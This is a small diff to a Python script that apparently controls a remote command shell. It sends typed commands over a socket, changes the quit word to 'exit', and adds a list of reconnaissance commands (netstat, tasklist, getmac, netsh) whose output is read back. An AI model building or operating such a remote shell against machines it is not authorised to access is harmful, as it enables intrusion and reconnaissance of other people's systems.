@@ -55,10 +55,13 @@ while True:
     #input and sending the command
     command = input(">>>")
     client_socket.send(command.encode())
-    if command.lower() == "quit":
+    if command.lower() == "exit":
         break
     #retrieve response
-    response = client_socket.recv(buffer).decode()
-    print(response)
+    #A list of commands that return information so that I can fix the problem of not being able to use commands that don't return information.
+    Data_ret_comm = ["dir", "ls", "ifconfig", "ipconfig", "cat", "echo", "find", "finger", "grep", "groups", "head", "history", "less", "man", "move", "ping", "ps", "pwd", "tail", "uname", "w", "netstat", "route", "net", "tasklist", "getmac","netsh", "help"]
+    if command.split()[0] in Data_ret_comm:
+        response = client_socket.recv(buffer).decode()
+        print(response)
 client_socket.close()
 s.close()
